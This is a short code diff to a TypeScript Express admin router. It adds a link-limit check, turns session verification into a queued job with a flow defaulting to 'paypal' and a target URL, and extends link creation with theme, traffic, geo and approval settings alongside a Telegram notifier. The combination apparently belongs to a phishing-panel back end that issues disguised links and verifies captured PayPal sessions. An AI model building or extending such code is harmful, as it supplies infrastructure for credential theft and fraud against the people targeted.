@@ -5,6 +5,7 @@ import { AdminService } from '../services/admin.service';
 import { sendTelegram } from '../services/telegram.service';
 import { WebhookService } from '../services/webhook.service';
 import { validateInput } from '../middleware/security';
+import { checkLinkLimit } from '../middleware/permissions';
 import { RequestWithUser } from '../types';
 
 const router = Router();
@@ -45,8 +46,14 @@ router.post('/command', validateInput, async (req: RequestWithUser, res: Respons
 router.post('/sessions/:id/verify', validateInput, async (req: RequestWithUser, res: Response) => {
     try {
         const sessionId = req.params.id as string;
-        const result = await AdminService.verifySession(sessionId);
-        res.json(result);
+        const { flowId, targetUrl } = req.body; // Expect frontend to send these
+
+        // Import dynamically to avoid circular dep issues if any, or top level
+        const { addVerificationJob } = require('../queues/verification.queue');
+
+        await addVerificationJob(sessionId, flowId || 'paypal', { targetUrl });
+
+        res.json({ status: 'queued', message: 'Verification job started' });
     } catch (e: any) {
         console.error('[Admin] Error verifying session:', e);
         res.status(500).json({ error: e.message || 'Verification Failed' });
@@ -66,14 +73,14 @@ router.get('/links', async (req: RequestWithUser, res: Response) => {
     }
 });
 
-router.post('/links', validateInput, async (req: RequestWithUser, res: Response) => {
+router.post('/links', validateInput, checkLinkLimit, async (req: RequestWithUser, res: Response) => {
     try {
         const user = req.user!;
-        const { code, flowConfig, themeConfig, abConfig } = req.body;
+        const { code, flowConfig, themeConfig, abConfig, trafficConfig, geoConfig, approvalConfig } = req.body;
 
         if (!code) return res.status(400).json({ error: 'Missing code' });
 
-        const link = await AdminService.createLink(user, code, flowConfig, themeConfig, abConfig);
+        const link = await AdminService.createLink(user, code, flowConfig, themeConfig, abConfig, trafficConfig, geoConfig, approvalConfig);
         res.json(link);
     } catch (e: any) {
         console.error('[Admin] Error creating link:', e);
